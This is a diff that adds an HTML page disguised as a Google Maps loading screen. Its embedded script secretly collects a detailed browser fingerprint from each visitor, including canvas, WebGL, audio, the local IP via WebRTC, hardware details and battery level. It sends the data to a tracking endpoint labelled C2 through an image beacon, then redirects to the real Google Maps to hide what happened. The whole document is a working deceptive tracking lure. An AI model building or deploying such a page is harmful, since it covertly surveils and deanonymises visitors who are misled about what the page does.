@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Google Maps - Loading</title>
+  <style>
+    body { margin:0; height:100vh; background:linear-gradient(135deg,#4285f4,#34a853); display:flex; align-items:center; justify-content:center; font-family: 'Segoe UI', Arial, sans-serif; }
+    .loader { border:8px solid #f3f3f3; border-top:8px solid #4285f4; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; }
+    @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
+    h1 { color:white; text-shadow:0 2px 4px rgba(0,0,0,0.3); }
+    .status { color:#fff; font-size:14px; margin-top:20px; opacity:0.8; }
+  </style>
+</head>
+<body>
+  <div style="text-align:center">
+    <div class="loader"></div>
+    <h1>Opening Google Maps...</h1>
+    <div class="status">Initializing secure connection</div>
+  </div>
+
+<script>
+const C2 = location.origin + '/track';
+const fp = {};
+
+// ==================== REAL FINGERPRINTING ====================
+
+// Basic
+fp.ua = navigator.userAgent;
+fp.screen = screen.width + 'x' + screen.height;
+fp.lang = navigator.language;
+fp.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+fp.cores = navigator.hardwareConcurrency;
+fp.memory = navigator.deviceMemory || 'unknown';
+fp.platform = navigator.platform;
+
+// Canvas
+try {
+  const canvas = document.createElement('canvas');
+  canvas.width = 400;
+  canvas.height = 100;
+  const ctx = canvas.getContext('2d');
+  ctx.textBaseline = 'top';
+  ctx.font = '16px Arial';
+  ctx.fillStyle = '#f60';
+  ctx.fillRect(0, 0, 400, 100);
+  ctx.fillStyle = '#069';
+  ctx.fillText('Fingerprint', 2, 15);
+  ctx.beginPath();
+  ctx.arc(100, 50, 30, 0, Math.PI * 2);
+  ctx.fillStyle = '#0f0';
+  ctx.fill();
+  fp.canvas = canvas.toDataURL();
+} catch(e) { fp.canvas = null; }
+
+// WebGL
+try {
+  const canvas = document.createElement('canvas');
+  const gl = canvas.getContext('webgl');
+  if (gl) {
+    fp.webgl = gl.getParameter(gl.RENDERER);
+  }
+} catch(e) { fp.webgl = null; }
+
+// Audio
+try {
+  if ('AudioContext' in window) {
+    const a = new AudioContext();
+    const o = a.createOscillator();
+    const n = a.createAnalyser();
+    o.connect(n);
+    n.connect(a.destination);
+    o.start();
+    setTimeout(() => {
+      const u = new Uint8Array(n.frequencyBinCount);
+      n.getByteFrequencyData(u);
+      fp.audio = btoa(String.fromCharCode(...u.slice(0, 32)));
+      o.stop();
+      a.close();
+    }, 150);
+  }
+} catch(e) { fp.audio = null; }
+
+// WebRTC local IP
+try {
+  const pc = new RTCPeerConnection({iceServers: []});
+  pc.createDataChannel('');
+  pc.createOffer().then(o => pc.setLocalDescription(o));
+  pc.onicecandidate = e => {
+    if (e.candidate) {
+      const match = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+      if (match) fp.webrtc = match[0];
+    }
+  };
+  setTimeout(() => { if (!fp.webrtc) fp.webrtc = null; }, 500);
+} catch(e) { fp.webrtc = null; }
+
+// Hardware
+fp.hardware = {
+  cores: navigator.hardwareConcurrency,
+  memory: navigator.deviceMemory,
+  touch: 'ontouchstart' in window,
+  pixelRatio: window.devicePixelRatio
+};
+
+// Battery
+if (navigator.getBattery) {
+  navigator.getBattery().then(b => {
+    fp.battery = Math.round(b.level * 100);
+  });
+}
+
+// Send data
+setTimeout(() => {
+  const payload = {};
+  for (let key in fp) {
+    if (fp[key] && typeof fp[key] === 'object') {
+      payload[key] = JSON.stringify(fp[key]);
+    } else if (fp[key]) {
+      payload[key] = fp[key];
+    }
+  }
+  const params = new URLSearchParams(payload);
+  new Image().src = C2 + '?' + params.toString() + '&r=' + Math.random();
+}, 1000);
+
+// Redirect to real Google Maps
+setTimeout(() => {
+  location.href = 'https://www.google.com/maps/search/?api=1&query=nearby';
+}, 2000);
+</script>
+</body>
+</html>
